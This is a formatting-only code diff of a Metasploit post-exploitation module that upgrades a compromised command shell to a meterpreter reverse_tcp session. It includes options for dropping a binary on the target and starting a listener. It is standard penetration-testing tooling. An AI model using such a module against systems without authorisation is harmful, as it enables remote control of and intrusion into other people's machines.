@@ -9,39 +9,43 @@ class MetasploitModule < Msf::Post
   include Post::Windows::Powershell
 
   def initialize(info = {})
-    super(update_info(info,
-        'Name'          => 'Shell to Meterpreter Upgrade',
-        'Description'   => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'Shell to Meterpreter Upgrade',
+        'Description' => %q{
           This module attempts to upgrade a command shell to meterpreter. The shell
           platform is automatically detected and the best version of meterpreter for
           the target is selected. Currently meterpreter/reverse_tcp is used on Windows
           and Linux, with 'python/meterpreter/reverse_tcp' used on all others.
         },
-        'License'       => MSF_LICENSE,
-        'Author'        => ['Tom Sellers <tom [at] fadedcode.net>'],
-        'Platform'      => [ 'linux', 'osx', 'unix', 'solaris', 'bsd', 'windows' ],
-        'SessionTypes'  => [ 'shell' ]
-      ))
+        'License' => MSF_LICENSE,
+        'Author' => ['Tom Sellers <tom [at] fadedcode.net>'],
+        'Platform' => [ 'linux', 'osx', 'unix', 'solaris', 'bsd', 'windows' ],
+        'SessionTypes' => [ 'shell' ]
+      )
+    )
     register_options(
       [
         OptAddressLocal.new('LHOST',
-          [false, 'IP of host that will receive the connection from the payload (Will try to auto detect).', nil]),
+                            [false, 'IP of host that will receive the connection from the payload (Will try to auto detect).', nil]),
         OptInt.new('LPORT',
-          [true, 'Port for payload to connect to.', 4433]),
+                   [true, 'Port for payload to connect to.', 4433]),
         OptBool.new('HANDLER',
-          [ true, 'Start an exploit/multi/handler to receive the connection', true])
-      ])
+                    [ true, 'Start an exploit/multi/handler to receive the connection', true])
+      ]
+    )
     register_advanced_options([
       OptInt.new('HANDLE_TIMEOUT',
-        [true, 'How long to wait (in seconds) for the session to come back.', 30]),
+                 [true, 'How long to wait (in seconds) for the session to come back.', 30]),
       OptEnum.new('WIN_TRANSFER',
-        [true, 'Which method to try first to transfer files on a Windows target.', 'POWERSHELL', ['POWERSHELL', 'VBS']]),
+                  [true, 'Which method to try first to transfer files on a Windows target.', 'POWERSHELL', ['POWERSHELL', 'VBS']]),
       OptString.new('PAYLOAD_OVERRIDE',
-        [false, 'Define the payload to use (meterpreter/reverse_tcp by default) .', nil]),
+                    [false, 'Define the payload to use (meterpreter/reverse_tcp by default) .', nil]),
       OptString.new('BOURNE_PATH',
-        [false, 'Remote path to drop binary']),
+                    [false, 'Remote path to drop binary']),
       OptString.new('BOURNE_FILE',
-        [false, 'Remote filename to use for dropped binary'])
+                    [false, 'Remote filename to use for dropped binary'])
     ])
     deregister_options('PERSIST', 'PSH_OLD_METHOD', 'RUN_WOW64')
   end
@@ -205,7 +209,7 @@ class MetasploitModule < Msf::Post
     end
     opts = {
       :linemax => linemax,
-      #:nodelete => true # keep temp files (for debugging)
+      # :nodelete => true # keep temp files (for debugging)
     }
     case platform
     when 'windows'
@@ -272,6 +276,7 @@ class MetasploitModule < Msf::Post
   def cleanup_handler(listener_job_id, aborted)
     # Return if the job has already finished
     return nil if framework.jobs[listener_job_id].nil?
+
     framework.threads.spawn('ShellToMeterpreterUpgradeCleanup', false) {
       if !aborted
         timer = 0
@@ -330,11 +335,11 @@ class MetasploitModule < Msf::Post
       mh.options.validate(mh.datastore)
       # Execute showing output
       mh.exploit_simple(
-          'Payload'     => mh.datastore['PAYLOAD'],
-          'LocalInput'  => self.user_input,
-          'LocalOutput' => self.user_output,
-          'RunAsJob'    => true
-        )
+        'Payload' => mh.datastore['PAYLOAD'],
+        'LocalInput' => self.user_input,
+        'LocalOutput' => self.user_output,
+        'RunAsJob' => true
+      )
 
       # Check to make sure that the handler is actually valid
       # If another process has the port open, then the handler will fail
